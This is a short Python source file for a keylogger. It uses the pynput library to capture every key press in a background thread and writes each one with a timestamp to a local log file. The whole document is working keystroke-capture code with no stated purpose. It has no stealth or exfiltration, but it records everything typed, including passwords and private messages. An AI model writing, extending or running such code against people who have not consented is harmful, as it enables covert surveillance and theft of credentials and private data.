from pynput import keyboard
from datetime import datetime
import threading

class KeyLogger:
    def __init__(self, log_file="key_log.txt"):
        self.log_file = log_file
        self.listener = None

    def on_press(self, key):
        try:
            key_name = key.char
        except AttributeError:
            key_name = str(key).replace("Key.", "").capitalize()
            key_name = f"[{key_name}]"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Key Pressed: {key_name}\n"
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        thread = threading.Thread(target=self.listener.run)
        thread.start()
        return self.listener
